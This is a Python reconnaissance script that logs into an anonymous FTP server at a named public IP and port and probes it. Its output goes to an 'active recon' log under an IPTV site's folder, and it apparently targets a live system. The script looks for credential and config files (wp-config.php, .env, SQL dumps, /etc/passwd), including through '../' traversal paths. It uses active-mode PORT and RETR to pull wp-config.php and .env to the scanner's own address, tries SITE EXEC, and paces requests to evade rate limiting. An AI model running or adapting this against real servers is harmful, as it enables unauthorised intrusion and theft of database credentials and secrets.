#!/usr/bin/env python3
"""Final FTP enumeration - single connection, with delays."""
import ftplib
import time
import socket

HOST = "103.160.107.175"
PORT = 6969
MAP = "/home/ubuntu/iptvgear.site/recon/active/ftp_filesystem.txt"

def log(msg=""):
    with open(MAP, "a") as f:
        f.write(msg + "\n")
    print(msg)

log(f"\n{'='*70}")
log("FINAL FTP ENUMERATION - SINGLE CONNECTION")
log(f"{'='*70}")

# Wait for rate limit to clear
log("Waiting 10s for rate limit to clear...")
time.sleep(10)

try:
    ftp = ftplib.FTP()
    ftp.connect(HOST, PORT, timeout=30)
    ftp.login("anonymous", "anonymous@test.com")
    log("Connected and logged in.")
    
    # 1. Root STAT (baseline)
    log(f"\n--- BASELINE: ROOT STAT ---")
    stat_root = ftp.sendcmd("STAT")
    log(stat_root)
    
    # 2. Try STAT on each visible subdirectory
    for subdir in ['FTP-shared', 'root', 'lost+found']:
        log(f"\n--- CWD {subdir} ---")
        try:
            resp = ftp.sendcmd(f"CWD {subdir}")
            log(f"CWD {subdir}: {resp}")
            pwd = ftp.pwd()
            log(f"PWD: {pwd}")
            stat = ftp.sendcmd("STAT")
            log(f"STAT:\n{stat}")
            time.sleep(0.5)
        except Exception as e:
            log(f"Error: {e}")
    
    # 3. Return to root
    ftp.sendcmd("CWD /")
    time.sleep(0.5)
    
    # 4. MDTM and SIZE on most important files
    important = [
        "wp-config.php", ".env", ".htaccess", 
        "index.php", "index.html",
        "config.php", "db.php",
        "backup.sql", "dump.sql",
        "../wp-config.php", "../.env",
        "FTP-shared/wp-config.php", "FTP-shared/.env",
        "root/wp-config.php", "root/.env",
        "passwd", "/etc/passwd",
        "composer.json",
    ]
    
    log(f"\n--- MDTM+SIZE CHECKS ---")
    for f in important:
        for cmd in ["MDTM", "SIZE"]:
            try:
                resp = ftp.sendcmd(f"{cmd} {f}")
                log(f"{cmd} {f}: {resp}")
            except Exception as e:
                log(f"{cmd} {f}: {e}")
            time.sleep(0.3)
    
    # 5. Try PORT mode again with public IP
    log(f"\n--- PORT MODE WITH PUBLIC IP ---")
    # Get public IP
    import urllib.request
    try:
        public_ip = urllib.request.urlopen("http://ifconfig.me", timeout=10).read().decode().strip()
        log(f"Public IP: {public_ip}")
    except:
        public_ip = "172.31.21.9"
        log(f"Using private IP: {public_ip}")
    
    parts = public_ip.split(".")
    # Use port 8889
    p1 = 8889 // 256  # 34
    p2 = 8889 % 256   # 185
    port_cmd = f"PORT {','.join(parts)},{p1},{p2}"
    log(f"PORT command: {port_cmd}")
    
    try:
        resp = ftp.sendcmd(port_cmd)
        log(f"PORT response: {resp}")
        time.sleep(0.5)
        resp = ftp.sendcmd("RETR wp-config.php")
        log(f"RETR wp-config.php: {resp}")
        time.sleep(0.5)
        resp = ftp.sendcmd("RETR .env")
        log(f"RETR .env: {resp}")
    except Exception as e:
        log(f"PORT/RETR error: {e}")
    
    # 6. Try SITE commands
    log(f"\n--- SITE COMMANDS ---")
    for cmd in ["SITE HELP", "SITE EXEC", "SITE PS", "SITE WHO", "SITE CHMOD", "SITE MKDIR"]:
        try:
            resp = ftp.sendcmd(cmd)
            log(f"{cmd}: {resp}")
        except Exception as e:
            log(f"{cmd}: {e}")
        time.sleep(0.3)
    
    # 7. Try ACCT command
    try:
        resp = ftp.sendcmd("ACCT anonymous")
        log(f"ACCT: {resp}")
    except Exception as e:
        log(f"ACCT: {e}")
    
    # 8. ALLO and HELP
    try:
        resp = ftp.sendcmd("HELP")
        log(f"HELP:\n{resp}")
    except Exception as e:
        log(f"HELP: {e}")
    
    # 9. MODE S (stream)
    try:
        resp = ftp.sendcmd("MODE S")
        log(f"MODE S: {resp}")
    except Exception as e:
        log(f"MODE S: {e}")
    
    # 10. STRU F (file structure)
    try:
        resp = ftp.sendcmd("STRU F")
        log(f"STRU F: {resp}")
    except Exception as e:
        log(f"STRU F: {e}")
    
    # 11. TYPE I (binary)
    try:
        resp = ftp.sendcmd("TYPE I")
        log(f"TYPE I: {resp}")
    except Exception as e:
        log(f"TYPE I: {e}")
    
    # 12. SYST
    try:
        resp = ftp.sendcmd("SYST")
        log(f"SYST: {resp}")
    except Exception as e:
        log(f"SYST: {e}")
    
    # 13. FEAT / HELP SITE
    try:
        resp = ftp.sendcmd("FEAT")
        log(f"FEAT:\n{resp}")
    except Exception as e:
        log(f"FEAT: {e}")
    
    ftp.quit()
    log("\nFINAL ENUMERATION COMPLETE")

except Exception as e:
    log(f"Connection error: {e}")